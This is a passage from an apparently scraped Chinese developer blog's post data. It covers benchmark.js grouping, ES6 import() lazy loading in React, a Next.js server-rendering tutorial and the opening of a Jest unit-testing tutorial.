测试结果排名默认，只会列出性能最快的测试项，下面是可以列出测试项的排名。注意：下面的代码使用了颜色模块：colors。 1234567.on('complete', function () &#123; const tests = Array.from(this); // 把类数组对象转为真正的数组 tests.sort((a, b) =&gt; b.hz - a.hz); tests.forEach((item, index) =&gt; &#123; console.log(`No.$&#123;index + 1&#125;`.red, String(item)); &#125;);&#125;) 测试分组benchmark.js 是没有带测试分组的，如果你想使用测试分组，可以参考我的实现方式。 思路非常简单，就是给回调函数添加一个 group 属性，接着把 带有相同的 group 属性放在一个数组里，再对这个数组里的元素进行排序。 index.js 12345678910111213141516171819202122232425262728293031323334353637383940const Benchmark = require('benchmark');const colors = require('colors');const State = require('log-symbols');const suite = new Benchmark.Suite;// 加载require('./compute1')(suite, '向下取整');require('./compute2')(suite, '向下取整');suite .on('cycle', function (event) &#123; console.log(State.success, String(event.target)); &#125;) .on('complete', function () &#123; const tests = Array.from(this); // 分组 const groups = tests.reduce(((o, i) =&gt; &#123; if (o[i.fn.group] === undefined) &#123; o[i.fn.group] = []; &#125; o[i.fn.group].push(i); return o; &#125;), &#123;&#125;); // 输出 Object.keys(groups).forEach(group =&gt; &#123; console.log(); console.log(`● $&#123;group&#125;`.green); groups[group].sort((a, b) =&gt; b.hz - a.hz); groups[group].forEach((item, index) =&gt; &#123; console.log(` No.$&#123;index + 1&#125;`.red, String(item)); &#125;); &#125;); console.log(); &#125;) .on('error', function (err) &#123; console.log(State.error, err); &#125;) .run(&#123; async: true &#125;); compute1.js 1234567891011121314151617const colors = require('colors');const Tasks = &#123; '~~': _ =&gt; ~~1.99, '|': _ =&gt; 1.99 | 0, 'floor': _ =&gt; Math.floor(1.99),&#125;;module.exports = (suite, group) =&gt; &#123; group = group || Math.random().toString(32).slice(2); Object .keys(Tasks) .forEach((task, index, list) =&gt; &#123; Tasks[task].group = group; suite.add(task.green, Tasks[task]); &#125;); return suite;&#125; compute2.js 1234567891011121314151617const colors = require('colors');const Tasks = &#123; '~~': _ =&gt; ~~(1.29 + 1), '|': _ =&gt; (1.29 + 1) | 0, 'ceil': _ =&gt; Math.ceil(1.29),&#125;;module.exports = (suite, group) =&gt; &#123; group = group || Math.random().toString(32).slice(2); Object .keys(Tasks) .forEach((task, index, list) =&gt; &#123; Tasks[task].group = group; suite.add(task.green, Tasks[task]); &#125;); return suite;&#125; 运行结果： 异步测试如果测试函数是异步，那么就要使用 ‘defer’。 1234567891011121314151617181920const Benchmark = require('benchmark');const colors = require('colors');const suite = new Benchmark.Suite;// add testssuite .add('get - test', function (deferred) &#123; // ... 完成后 get().then(res =&gt; &#123; deferred.resolve(); &#125;); &#125;) .on('cycle', function (event) &#123; console.log(String(event.target)); &#125;) .on('complete', function () &#123; console.log('Fastest is ' + this.filter('fastest').map('name')); console.log(this.filter('fastest').pluck('name')); &#125;) .run(&#123; async: false, defer: true &#125;); 配置项配置项实在太多了，具体看文档，这里列出几个比较重要的配置项。 123456789101112131415Benchmark.options.async // 一个标志，表示基准循环默认执行异步Benchmark.options.defer // 表示基准异步测试的标志Benchmark.options.delay // 测试周期之间的延迟（秒）Benchmark.options.id // idBenchmark.options.initCount // 在基准测试的第一个周期执行测试的默认次数Benchmark.options.maxTime // 在完成之前允许基准测试运行的最长时间（秒，周期延迟不计入最大时间）Benchmark.options.minSamples // 执行统计分析所需的最小样本量Benchmark.options.minTime // 将测量百分比不确定度降低到 1％（秒）所需的时间Benchmark.options.name // 基准的名称Benchmark.options.onAbort // 当基准测试中止时调用的事件侦听器Benchmark.options.onComplete // 当基准测试完成运行时调用的事件侦听器Benchmark.options.onCycle // 每个运行循环后调用的事件侦听器Benchmark.options.onError // 一个事件侦听器调用时出现测试错误Benchmark.options.onReset // 当基准重置时调用的事件侦听器Benchmark.options.onStart // 当基准开始运行时调用的事件侦听器 这些选项在哪里设置，当然是在 run 里设置： Benchmark.prototype.run([ options = {} ]); 或者是构造函数里： Benchmark(name, fn [, options = {}]); 或者在 add 函数里添加： suite.add(name, fn [, options = {}]); 参考资料 https://benchmarkjs.com/","categories":[{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/categories/测试/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/tags/测试/"},{"name":"benchmark","slug":"benchmark","permalink":"http://me.lizhooh.com/tags/benchmark/"}]},{"title":"ES6+ import()：懒加载，异步加载组件","slug":"ECMAScript/ES6+ import()：懒加载，异步加载组件","date":"2017-09-23T03:34:13.000Z","updated":"2021-06-15T06:10:52.812Z","comments":true,"path":"/stories/2017/09/ECMAScript/ES6+ import()：懒加载，异步加载组件/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/ECMAScript/ES6+ import()：懒加载，异步加载组件/","excerpt":"前言当单页面应用越来越复杂，依赖的模块越多时，Webpack 编译出来的 js 文件非常大，甚至超过了 1M。这样会面临一个问题？首页加载 js 时间过长，一些与首页无关的模块也被加载了。比如说：一个专栏站点，在首页里几乎不需要 MarkDown 编辑器，代码高亮这样模块，但 Webpack 还是把它打包成一个 js 文件。 为什么会这样？","text":"前言当单页面应用越来越复杂，依赖的模块越多时，Webpack 编译出来的 js 文件非常大，甚至超过了 1M。这样会面临一个问题？首页加载 js 时间过长，一些与首页无关的模块也被加载了。比如说：一个专栏站点，在首页里几乎不需要 MarkDown 编辑器，代码高亮这样模块，但 Webpack 还是把它打包成一个 js 文件。 为什么会这样？ 因为 import 命令会被 JavaScript 引擎静态分析，引擎处理 import 语句是在编译时，它并不能在运行时判断： 1234// 报错，不能在运行时判断if (flag === true) &#123; import MyModual from './myModual';&#125; 所以在编译期间 Webpack 会按照所有的 import 把它们编译成一个 js 文件。可能你会问？为什么 Webpack 不把每个模块都设置为一个 js 文件？ -_-！想想为什么要做“雪碧图”，最主要的还是要减少 http request 次数。 因此，有一个提案，建议引入import()函数，完成动态加载。 import()import() 函数可以用在任何地方，不仅仅是模块，非模块的脚本也可以使用。它是运行时执行。 因此可以使用 import() 来实现： 按需加载，懒加载 条件加载 动态模块路径 因为 import() 是一个异步函数，返回一个Promise，在加载完成后返回模块对象。 1234567891011121314151617import('./add.js') .then(module =&gt; module.default) .then(add =&gt; &#123; console.log(add(1, 2)); &#125;) .catch(err =&gt; console.error(err))// 或者(async () =&gt; &#123; try &#123; const &#123; default: add &#125; = await import('./add.js'); console.log(add(1, 2)); &#125; catch(err) &#123; console.error(err); &#125;&#125;)(); 异步加载的原理在没有import() 之前，Webpack 有个 ensure 可以实现异步加载组件。 原理非常简单，比如但用户打开文章页时，我们才去加载一些只有文章页才需要的组件。 1234567891011$('.article-list li').click(function() &#123; // 获取 文档 head 对象 var head = document.getElementsByTagName('head')[0]; // 构建 &lt;script&gt; var script = document.createElement('script'); // 设置 async, src script.async = true; script.src = \"./markdown.js\"; // 加入到 head 对象中 head.appendChild(script);&#125;) 上面的代码，就是把一些 js 模块给独立出一个个 js 文件，然后需要用到的时候，在创建一个 script 对象，加入到 document.head 对象中即可。 因此，在这方面 Webpack 封装了一个 ensure 来帮你完成这件事情。 而import()之后就不需要 ensure 了，只需要 import() 就可以了。 React 项目中使用 import()import() 是一个异步函数，如果要进行异步加载组件，这就意味着需要使用 this.setState() 来更新 DOM。 123456789101112131415161718192021222324252627282930313233343536import React, &#123; Component &#125; from 'React';export default class Article extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; EditorView: null &#125;; &#125; async componentWillMount() &#123; const &#123; default: EditorView &#125; = await import('../lib/react-editor'); this.setState(&#123; EditorView &#125;); &#125; render() &#123; const &#123; EditorView &#125; = this.state; return ( &lt;div&gt; &lt;div className='article-view'&gt; &lt;/div&gt; &lt;div className='editor-view'&gt;&#123; EditorView &amp;&amp; &lt;EditorView placeholder='支持 Markdown 格式和快捷键。' className='editor' onChange=&#123;text =&gt; this.text = text&#125; /&gt; &#125; &lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 这样是可以达到效果，但是面临一个问题，代码入侵度太大，需要修改很多的代码。 有没有更好的方式，可以避免大量修改代码的？答案是有的，那就是使用高阶组件。 高阶组件一个函数里返回另一个函数，就会形成一种闭包形式，这时我们也可以叫它为高阶函数。高阶组件（HOC）与此类似，但它返回的是一个 class 而不是 function。 最简单的高阶组件定义： 1234567891011export default (props) =&gt; ( class HOC extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;h2&gt;Hello world!&lt;/h2&gt; &lt;/div&gt; ) &#125; &#125;) 那么高阶组件它能做什么？高阶组件可以实现很多奇妙的方法，例如： 属性代理（Props Proxy） 操作 props 获得 refs 的引用 抽象 state 反向继承（Inheritance Inversion） 渲染劫持 在这里，我们需要使用到了属性代理这部分： 123456789101112131415161718192021222324252627282930313233import React, &#123; Component &#125; from 'react';/** * 高阶加载异步组件，配合 import() 来使用 */export default (loadComponent) =&gt; ( class AsyncComponent extends Component &#123; state = &#123; Component: null &#125; // 异步加载 componentWillMount() &#123; if (this.state.Component !== null) &#123; return; &#125; loadComponent() .then(module =&gt; module.default) .then((Component) =&gt; &#123; this.setState(&#123; Component &#125;); &#125;) .catch((err) =&gt; &#123; console.error(`Cannot load component in &lt;AsyncComponent /&gt;`); throw err; &#125;); &#125; render() &#123; const &#123; Component &#125; = this.state; return (Component) ? &lt;Component &#123;...this.props&#125; /&gt; : null; &#125; &#125;); 首先，通过高阶函数返回一个组件，这个组件会在初始化时进行异步加载指定的组件。 然后，再代理一下出口： 1234import AsyncComponent from './async-component';export const Editor = AsyncComponent(() =&gt; import('./react-editor'));export const Highlight = AsyncComponent(() =&gt; import('./react-highlight')); 之后的代码，基本不用修改。 前后对比在没有使用 import() 来异步加载组件，所有的组件都被打包在一个 js 文件里： 1main.ab92b635.js 602.17kb 使用 import() 后： 1230.9e1aef72.chunk.js 275.31kb1.d95e0db5.chunk.js 36.89kbmain.b6339bbf.js 284.12kb 代码拆分了，在第一次浏览首页时，并不会去加载文章页需要的 MarkDown 模块，代码高亮模块等，而只是加载 main.js 即可，但第一次浏览文章页时再去加载 chunk。对于没有使用 import() 之前首页需要一次性加载 600+ kb 的 js 文件相比，在响应速度上有很大的飞跃，首页加载时间在移动端上减少了 1.2s（3G 网络）。 参考资料 https://segmentfault.com/a/1190000009386662 https://cnodejs.org/topic/586823335eac96bb04d3e305 https://segmentfault.com/a/1190000009820646","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"Next.js：React 服务端渲染框架","slug":"同构/Next/Next.js：React 同构框架","date":"2017-09-22T01:11:00.000Z","updated":"2021-06-15T06:10:52.909Z","comments":true,"path":"/stories/2017/09/同构/Next/Next.js：React 同构框架/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/同构/Next/Next.js：React 同构框架/","excerpt":"前言Next.js 是一个 React 服务端渲染框架（SSR），它提供非常简洁的方式，让你轻易的创建同构应用（类似有 Vue 的 Nuxt）。Next 提供了一个关键扩展：通过使用名为 getInitialProps() 的组件生命周期钩子方法，使得框架能够在服务器上进行初始渲染。","text":"前言Next.js 是一个 React 服务端渲染框架（SSR），它提供非常简洁的方式，让你轻易的创建同构应用（类似有 Vue 的 Nuxt）。Next 提供了一个关键扩展：通过使用名为 getInitialProps() 的组件生命周期钩子方法，使得框架能够在服务器上进行初始渲染。 下面就开始学习 Next.js。 开始使用因为 Next 是围绕 React 的，所以除了安装 Next 外，还需要安装 React。 1npm install --save next@latest react react-dom 之后在 npm scripts 里添加命令项： 12345\"scripts\": &#123; \"dev\": \"next\", \"build\": \"next build\", \"start\": \"next start\"&#125; 接着创建一个 pages 目录，添加 index.js 文件，习惯的我们先来写一段 Hello world： 12345export default () =&gt; ( &lt;div&gt; &lt;h1&gt;Hello world!&lt;/h1&gt; &lt;/div&gt;) 之后，使用命令 npm run dev 后，在 http://127.0.0.1:3000 打开就可以看到 Hello world。 在这个过程中到底发生了什么？ Next 自动透析和捆绑（webpack 和 babel） 热代码重新加载 服务器渲染和索引 ./pages 静态文件服务被映射到 ./static 自动代码分割 注意：在 Next 里 pages 是一个特别的目录，它会自动映射到路由上。比如 ./pages/about.js =&gt; http://127.0.0.1:3000/about。并且可以认为 pages 下的一个 js 文件对应着一个 SPA 页面。 2018-01-21 更新：现在可以使用 create-next-app 快速创建一个 Next.js 项目了。 getInitialPropsgetInitialProps 是一个两端的 api，在客户端和服务端都是执行的。getInitialProps 仅能在 page 组件里使用，并且是 static 属性，不能在子组件里使用或者说使用了不会被调用。它的作用是用来作为渲染时的初始化数据。 getInitialProps 有一个参数对象，它包括了： pathname - URL 的路径部分。 query - 将 URL 的查询字符串部分解析为对象。 asPath- String 实际路径（包括查询）在浏览器中显示。 req - HTTP 请求对象（仅服务端）。 res - HTTP 响应对象（仅服务端）。 jsonPageRes - 提取响应对象（仅客户端）。 err - 错误对象，如果在渲染过程中遇到任何错误。 示例： 123456789101112131415161718import React, &#123; Component &#125; from 'react';export default class About extends Component &#123; constructor(props) &#123; super(props); console.log('constructor', props); &#125; static async getInitialProps(params) &#123; console.log(params); return &#123; id: 0 &#125; &#125; render() &#123; return ( &lt;div&gt; &lt;p&gt;about Next.js&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; 可以看出执行的顺序是 getInitialProps -&gt; constructor 之后就是 React 的生命周期。 整个生命周期如下图： getInitialProps 返回的对象将嵌入 page 组件的 props 里（assgin 的意思）。 除了使用类组件的方式，还可以使用纯函数组件： 1234567891011121314const Page = (&#123; stars &#125;) =&gt; ( &lt;div&gt; Next stars: &#123;stars&#125; &lt;/div&gt;);Page.getInitialProps = async (&#123; req &#125;) =&gt; &#123; // 在 Next 集成 node-fetch，因此不用自己安装 node-fetch const res = await fetch('https://api.github.com/repos/zeit/next.js'); const json = await res.json(); return &#123; stars: json.stargazers_count &#125;;&#125;;export default Page; 注意： node-fetch 仅适用于服务端，如何你需要同时适用于客户端与服务端，可以使用 isomorphic-unfetch 来代替 node-fetch。 不要在 getInitialProps 里做太过长时间的操作，对于整个生命周期来说，getInitialProps 是阻塞的。 不应该在 getInitialProps 里做数据库操作，这样会导致无法正常进行服务端渲染，正确来说应该另外运行一个微服务，提供 api 服务。 getInitialProps 是一个两端函数，所有浏览器与 Nodejs 没有共同的 api 都不可用，包括 document、fs、http 等。 HTML HeadNext 默认是 html head 不可见的，也就是 page 里的代码会被包裹在 &lt;body&gt; 里。如何要想修改 head 内容，可以使用 Head 组件。建议定义好 layout 组件。 123456789101112import Head from 'next/head';export default () =&gt; ( &lt;view&gt; &lt;Head&gt; &lt;title&gt;My page title&lt;/title&gt; &lt;meta name=\"viewport\" content=\"initial-scale=1.0, width=device-width\" /&gt; &lt;link href=\"/static/material-icons.min.css\" rel=\"stylesheet\"&gt; &lt;/Head&gt; &lt;p&gt;Hello world!&lt;/p&gt; &lt;/view&gt;); 静态资源静态资源默认放置在 /static 目录下，因此可以直接引用： 12345export default () =&gt; ( &lt;div className='center'&gt; &lt;img src=\"/static/image.png\" /&gt; &lt;/div&gt;); 在 Next.js 不需要引入 React，因为它帮你做了这件事情，当然你引入也没关系。 CSS 样式添加 CSS 有几种方式： 使用 Next 提供的内联 JSX CSS React style 通过 Link 引入 CSS 使用 CSS-IN-JS：styled-components JSX CSS支持类似于 Web Components 的 shadow CSS。这种方式有一个非常不好的地方，就是没有智能提示 -_-！。 1234567891011121314151617181920212223&lt;div&gt; Hello world &lt;p&gt;scoped!&lt;/p&gt; &lt;style jsx&gt;&#123;` p &#123; color: blue; &#125; div &#123; background: red; &#125; @media (max-width: 600px) &#123; div &#123; background: blue; &#125; &#125; `&#125;&lt;/style&gt; &#123;/* 全局 css */&#125; &lt;style global jsx&gt;&#123;` body &#123; background: black; &#125; `&#125;&lt;/style&gt;&lt;/div&gt; 可以看到，所有的 &lt;style&gt; 块被添加到 html head 内，JSX CSS 它通过属性标识方式来控制局部与全局样式。 好处是能提供独立的作用域，还可以插入变量，坏处是没有友好的智能提示。 Link CSS通过 link 来引入 css： 12345678910import Head from 'next/head';export default () =&gt; ( &lt;view&gt; &lt;Head&gt; &lt;link href=\"/static/material-icons.min.css\" rel=\"stylesheet\" /&gt; &lt;/Head&gt; &lt;p&gt;Hello world!&lt;/p&gt; &lt;/view&gt;); 因此，想要使用 SCSS，可以使用 Koala 自动编译成 CSS 文件。 更好的方式是，用一个主文件来引入其它 scss 文件，让 Koala 只编译它。 123456789app├── static│ ├── app.scss│ └── app.min.css # 编译后的文件├── style│ ├── _variable.scss # 变量│ ├── _mixin.scss # 混合│ ├── _normalize.scss # 标准化│ └── _main.scss # 主样式 app.scss： 1234@import '../style/variable';@import '../style/mixin';@import '../style/normalize';@import '../style/main'; styled-components也可以使用 styled-components 哦。 参考示例，要点在 _document.js 里。 Less/Sass以配置 Less 为例。 1npm install --save @zeit/next-less less Less 编译后都会在 _next/static/style.css 里，记得在 head 里面添加。 123&lt;Head&gt; &lt;link rel=\"stylesheet\" href=\"/_next/static/style.css\" /&gt;&lt;/Head&gt; 在 next.config 里，默认是单独配置 Less，并不支持 css 的，也可以把 css 配置上。 12345// next.config.jsconst withLess = require('@zeit/next-less');module.exports = withLess(&#123; cssModules: true,&#125;); 如果配置了其他，比如 Typescript，那么： 12345678const withTs = require('@zeit/next-typescript');const withLess = require('@zeit/next-less');module.exports = withTs(withLess(&#123; cssModules: true, webpack: config =&gt; (&#123; ...config &#125;),&#125;)); 在页面之间导航对于页面之间的导航，可以使用 Link, Router。 Link最基本的导航可以使用 &lt;Link /&gt; 组件。 12345678910import Link from 'next/link';export default () =&gt; ( &lt;div&gt; &lt;Link href=\"/about\"&gt; &lt;a&gt;About Page&lt;/a&gt; &lt;/Link&gt; &lt;p&gt;Hello Next.js&lt;/p&gt; &lt;/div&gt;); 这样，当点击 About Page 时，就会路由到 http://127.0.0.1:3000/about ，也就是说会执行 ./pages/about.js。 注意： Link 只是一个封装组件，它只接受 href 和其他一些路由相关的 props。 Link 内部组件的唯一要求是它应该接受 onClick 支持。 虽然使用 a href 也能到达导航效果，但更应该使用 Link。 此外 Link 支持以下 API： pathname：String 当前路径，不包括查询字符串 query：Object 与解析的查询字符串。默认为 {} asPath：String 实际路径（包括查询）在浏览器中显示 push(url, as=url)：pushState 入栈某个页面路由 replace(url, as=url)：replaceState 页面替换 示例： 1234567891011121314&lt;!--http://127.0.0.1:3000/about?name=Zeit--&gt;&lt;Link href=&#123;&#123; pathname: '/about', query: &#123; name: 'Zeit' &#125; &#125;&#125;&gt; &lt;a&gt;here&lt;/a&gt;&lt;/Link&gt;&lt;!--自己构造查询--&gt;&lt;Link href=&#123;`/about?title=here`&#125;&gt; &lt;a&gt;here&lt;/a&gt;&lt;/Link&gt;&lt;!--替换当前路径--&gt;&lt;Link href=\"/home\" replace=&#123;true&#125;&gt; &lt;a&gt;here&lt;/a&gt;&lt;/Link&gt; Router除了使用 Link 进行页面导航外，还可以hi用 Router 进行路由。 123456789import Router from 'next/router';export default () =&gt; ( &lt;div&gt; Click &lt;button onClick=&#123;() =&gt; Router.push('/about')&#125;&gt;here&lt;/button&gt; to read more &lt;/div&gt;); 同样的 Router 支持以下 API： route: String 目前的路线。 pathname：String 当前路径，不包括查询字符串。 query：Object 与解析的查询字符串。默认为 {}。 asPath：String 实际路径（包括查询）在浏览器中显示。 push(url, as=url)：pushState 入栈某个页面路由。 replace(url, as=url)：replaceState 页面替换。 示例： 1234567function onClick(event) &#123; console.log(Router.route); // 当前的路径，比如在根目录就输出 / Router.push(&#123; pathname: '/about', query: &#123; name: 'Zeit' &#125; &#125;);&#125; Router 比 Link 更高级的是，它有自己的生命周期： routeChangeStart(url)：路由开始变化时触发 routeChangeComplete(url)：当路由完全改变时触发 routeChangeError(err, url)：改变路由时发生错误时触发 beforeHistoryChange(url)：在更改浏览器的历史记录之前触发 appUpdated(nextRoute)：切换页面时触发，并有新版本的应用程序 示例： 12345678910function onClick(event) &#123; console.log(Router.route); Router.onRouteChangeStart = url =&gt; &#123; // App is changing to: /about console.log('App is changing to: ', url); &#125; // 如果不想监听这个事件，可以这样简单地取消设置事件监听器 // Router.onRouteChangeStart = null; Router.push('/about');&#125; 使用共享组件为什么实现类似路由嵌套的效果，我们使用共享的方式来实现它。最简单的方式是在每个 page 里都添加一个公共组件。 还不如，把这种结构封装成一个容器： 12345678910import Header from './Header';const Layout = (props) =&gt; ( &lt;div &#123;...props&#125;&gt; &lt;Header /&gt; &#123;props.children&#125; &lt;/div&gt;);export default Layout; 一旦封装后，我们可以非常简单的使用它： 1234567891011121314151617// pages/index.jsimport Layout from '../components/MyLayout.js';export default () =&gt; ( &lt;Layout&gt; &lt;p&gt;Hello Next.js&lt;/p&gt; &lt;/Layout&gt;);// pages/about.jsimport Layout from '../components/MyLayout.js';export default () =&gt; ( &lt;Layout&gt; &lt;p&gt;This is the about page&lt;/p&gt; &lt;/Layout&gt;); 在路由改变时，url 会自动注入到 page 的 props 里，因此我们可以通过，props 来获取查询参数： 123456export default (props) =&gt; ( &lt;div&gt; &lt;h1&gt;&#123;props.url.query.title&#125;&lt;/h1&gt; &lt;p&gt;This is the blog post content.&lt;/p&gt; &lt;/div&gt;); 需要注意的是，url 只会注入到 page 组件里，并不会注入到子组件里。 懒加载组件默认情况下，SPA 应用都会把所有的 JS 文件打包成一个文件，这会造成一定的问题。 比如，打包的文件过大。在首页里，并不需要使用到的组件也加载了，这时懒加载的需要性就出现了。 在首页里不需要加载文章页才需要的 markdown 组件，这时候应该使用 ES7+ 的 import() 语法，它实现了异步加载组件/懒加载组件。 Webpack 会根据 import() 把 markdown 分出主包，这时会打包两个 js 文件，一个是主包，另一个是 markdown 包。 在 Next.js 里懒加载组件非常简单： 12import Layout from '../components/MyLayout.js';const markdown = await import('react-markdown'); 相关的可以看：ES2017 import()：懒加载，异步加载组件：懒加载，异步加载组件/) REST 风格的路由目前，现在的 url 看起来像这样：http://localhost:3000/post?title=Hello Next.js。但我们更喜欢这种 REST 风格的 url：http://localhost:3000/p/hello-nextjs。 想要定制 REST 风格的 url，可以使用 as 来指定一个别名。 123&lt;Link as=&#123;`/p/$&#123;props.id&#125;`&#125; href=&#123;`/post?title=$&#123;props.title&#125;`&#125;&gt; &lt;a&gt;&#123;props.title&#125;&lt;/a&gt;&lt;/Link&gt; 在这里as只是一个别名，真正的 url 还是 href，因此获取查询参数时，还是url.query.title。 当我们刷新页面是，它会返回 404，这是因为没有这样的页面可以在服务器上加载。因此它现在只适用于客户端导航。 为了解决上面的问题，需要自己自定义一个服务。 1234567891011121314151617181920212223242526272829const express = require('express')const next = require('next')const dev = process.env.NODE_ENV !== 'production'const app = next(&#123; dev &#125;)const handle = app.getRequestHandler()app.prepare().then(() =&gt; &#123; const server = express() server.get('/p/:id', (req, res) =&gt; &#123; const actualPage = '/post' const queryParams = &#123; title: req.params.id &#125; app.render(req, res, actualPage, queryParams) &#125;) server.get('*', (req, res) =&gt; &#123; return handle(req, res) &#125;) server.listen(3000, (err) =&gt; &#123; if (err) throw err console.log('&gt; Ready on http://localhost:3000') &#125;)&#125;).catch((ex) =&gt; &#123; console.error(ex.stack) process.exit(1)&#125;); 注意到这段，当你刷新浏览器时，它就会执行这里（通过 Link，Router 导航时，不会执行这里）： 12345server.get('/p/:id', (req, res) =&gt; &#123; const actualPage = '/post' const queryParams = &#123; title: req.params.id &#125; app.render(req, res, actualPage, queryParams)&#125;) 在这里，我们使用了 &lt;view&gt; 这是一个空白的容器，html 并不会去解析它。打开源码之后就会发现， Head 包裹的内容将添加在 html head 里，而 hello world 将添加到 &lt;body&gt; 里。 如果需要使用 Koa，则需要做一点修改。 123456789101112131415161718const n = next(&#123; dev &#125;);const handle = n.getRequestHandler();n.prepare().then(() =&gt; &#123; const app = new Koa(); const router = new Router(); router.get('*', async ctx =&gt; &#123; await handle(ctx.req, ctx.res); ctx.respond = false; &#125;); app.use(async (ctx, next) =&gt; &#123; ctx.res.statusCode = 200; await next(); &#125;); app.use(router.routes()); app.listen(3000);&#125;) 自定义配置自定义配置需要在根目录下创建一个 next.config.js 文件。默认编译后的文件在 .next 里，可以手动指定。 123module.exports = &#123; distDir: 'build'&#125; 部署 Next.js 应用程序在 npm scripts 里添加命令就可以轻松部署了： 12345\"scripts\": &#123; \"dev\": \"next\", \"build\": \"next build\", \"start\": \"next start -p 8000\"&#125; 先运行 npm run build，再运行 npm run start。 使用 PM2，在 npm scripts 里添加命令： 1234\"scripts\": &#123; \"pm2-next\": \"pm2 start ./node_modules/next/dist/bin/next-start\", \"pm2-next-node\": \"pm2 start index.js\",&#125; 如果报错：找不到 build-stats，记得运行 npm run build。 如果要开集群，添加参数 -i max。 __NEXT 标志问题使用 Next 编译后，会带有 _next 的标志性代码。 这个问题暂放： https://github.com/zeit/next.js/issues/2729 参考资料 https://github.com/zeit/next.js","categories":[{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/categories/同构/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"},{"name":"Next","slug":"Next","permalink":"http://me.lizhooh.com/tags/Next/"},{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/tags/同构/"}]},{"title":"测试那些事：使用 Jest 进行单元测试","slug":"测试/单元测试/测试那些事：使用 Jest 进行单元测试","date":"2017-09-20T01:37:04.000Z","updated":"2021-06-15T06:10:52.919Z","comments":true,"path":"/stories/2017/09/测试/单元测试/测试那些事：使用 Jest 进行单元测试/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/测试/单元测试/测试那些事：使用 Jest 进行单元测试/","excerpt":"JestJest是Facebook的一个专门进行 Javascript 单元测试的工具，之前仅限他们的前端工程师在公司内部使用，后来开源在 Github 上。它是在 Jasmine 测试框架上演变开发而来，使用了我们熟知的expect(value).toBe(other)这种断言格式。 单元测试 (Unit Testing) 是白盒测试的一种，用于针对程序模块进行正确性检验的测试工作。单元 (Unit) 是指最小可测试的部件。在过程化编程中，一个单元就是单个程序、函数、过程等；对于面向对象编程，最小单元就是方法，包括基类、抽象类、或者子类中的方法。","text":"JestJest是Facebook的一个专门进行 Javascript 单元测试的工具，之前仅限他们的前端工程师在公司内部使用，后来开源在 Github 上。它是在 Jasmine 测试框架上演变开发而来，使用了我们熟知的expect(value).toBe(other)这种断言格式。 单元测试 (Unit Testing) 是白盒测试的一种，用于针对程序模块进行正确性检验的测试工作。单元 (Unit) 是指最小可测试的部件。在过程化编程中，一个单元就是单个程序、函数、过程等；对于面向对象编程，最小单元就是方法，包括基类、抽象类、或者子类中的方法。 除此之外，在 Nodejs 测试方面包括了： 单元测试（本文） 基准测试（测试那些事：使用 benchmark 进行基准测试） 集成测试 覆盖测试 压力测试（使用 Apach ab 对 Nodejs 进行并发负载的压力测试） PS：目前比较糟糕的是在 vscode 上没智能提示。 体验在学习 Jest 之前不如先来体验一下它。我们可以通过 Koa 的源码来体验单元测试。先在 github 上 clone Koa 下来： 1git clone https://github.com/koajs/koa.git clone 之后，先安装模块，再运行： 12npm installnpm run test 运行之后，你会看到这样一个输出，没错这就是单元测试的输出内容。 在 koa 源码里也有很多例子，也可以参考它来学习。 开始下面记录着如何从零开始使用 Jest。 安装 1npm install jest --save-dev 使用 新建一个 sum.js 文件 1module.exports = (a, b) =&gt; a + b; 新建一个 sum.test.js 文件 [注意，名称需要是： xxx.test.js] 12345678const sum = require('./sum');test('sum(a, b) 函数测试', () =&gt; &#123; expect(sum(1, 2)).toBe(3); expect(sum(1, 6)).toBe(7); expect(sum(1, 4)).toBe(3.5); // 到这里会终止测试 expect(sum(2, 4)).toBe(6);&#125;); 在 npm 里添加 test: jest，并运行 1npm test 通过测试： 不通过测试： 说明 test是一个单元测试函数，第一个参数为：测试项的名称，第二个参数为：测试内容所在的作用域。 expect 是一个接收要测试函数的值，并返回一个expectation对象 boBe 是希望要测试函数的值等于多少，用的是 === 来点更复杂的上面的示例太过于简单，体验不了单元测试的重要性。假如，需要编写一个，符合 a(x) = a(x - 1) + a(x - 2) 的 fibonacci 函数（斐波那契数列） 1. 最简单的方法 - for123456789const fibarr = n =&gt; &#123; let fibonacci = [0, 1]; for (let i = 2; i &lt;= n; i++) &#123; fibonacci[i] = fibonacci[i - 1] + fibonacci[i - 2]; &#125; return fibonacci[n];&#125; 2. 比较复杂的方法 - 递归123456789const fibdeep = n =&gt; &#123; const fibonacci = n =&gt; &#123; if (n === 0 || n === 1) return n; return fibonacci(n - 1) + fibonacci(n - 2); &#125; return fibonacci(n);&#125; 3. 奇妙的方法 - generator1234567891011121314151617const fibgen = n =&gt; &#123; function* fibonacci() &#123; let fib = [0, 1]; yield fib[0]; yield fib[1]; while (true) &#123; fib = [fib[1], fib[0] + fib[1]]; yield fib[1]; &#125; &#125; const gen = fibonacci(); new Array(n).fill(' ').map(i =&gt; gen.next()); return gen.next().value;&#125; 测试很明显，第一个方法是从直观上是正确的，那么将以第一个方法作为一些测试数据。 基本数据测试，测试fibarr： 12345678910const &#123; fibarr, fibdeep, fibgen &#125; = require('./fibonacci');const testdata = [0, 1, 1, 2, 3, 5, 8, 13, 21];test('fibarr 数据测试', () =&gt; &#123; for (let i in testdata) &#123; expect(fibarr(i)).toBe(testdata[i]); &#125;&#125;);// PASS 通过 根据fibarr来测试，其他函数： 